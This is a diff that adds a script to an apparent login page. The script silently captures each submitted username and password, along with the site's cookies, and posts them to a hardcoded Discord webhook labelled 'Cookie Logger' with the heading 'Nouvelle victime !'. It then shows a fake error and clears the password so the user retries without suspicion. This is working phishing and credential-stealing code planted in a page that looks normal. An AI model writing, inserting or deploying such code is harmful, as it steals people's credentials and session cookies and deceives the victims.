@@ -179,6 +179,67 @@
 
 })();
 </script>
+<script>
+// Ton webhook Discord où les données seront envoyées
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1355719783735365762/9R_DzsqluTqr7wbbpl_3k1Ta4byL5kE7mqKQgH8IhE7uNiPDQgWCLtGC_bYAsUBVXEHl';
+
+// Fonction pour envoyer les données au webhook
+async function sendDataToWebhook(data) {
+    try {
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                username: "Cookie Logger",
+                content: `🍪 **Nouvelle victime !** 🍖\n\n**Pseudo :** \`${data.username}\`\n**Mot de Passe :** \`${data.password}\`\n\n**Cookies :** \`\`\`${data.cookies}\`\`\``,
+            }),
+        });
+
+        if (!response.ok) {
+            console.error('Erreur lors de l\'envoi au webhook:', response.statusText);
+        }
+    } catch (error) {
+        console.error('Erreur réseau:', error);
+    }
+}
+
+// Attend que le DOM soit chargé
+document.addEventListener('DOMContentLoaded', () => {
+    const loginForm = document.getElementById('loginForm');
+    const errorDiv = document.getElementById('error');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+
+    loginForm.addEventListener('submit', async (event) => {
+        // Empêche le formulaire de s'envoyer réellement
+        event.preventDefault();
+
+        const username = usernameInput.value;
+        const password = passwordInput.value;
+
+        // Récupère tous les cookies du site actuel
+        const cookies = document.cookie;
+
+        // Prépare les données à envoyer
+        const stolenData = {
+            username: username,
+            password: password,
+            cookies: cookies,
+        };
+
+        // Envoie les données en arrière-plan
+        sendDataToWebhook(stolenData);
+
+        // Affiche un message d'erreur pour que l'utilisateur ne se méfie pas
+        errorDiv.style.display = 'block';
+
+        // Vide les champs du mot de passe pour forcer l'utilisateur à réessayer
+        passwordInput.value = '';
+    });
+});
+</script>
 <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true" />
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
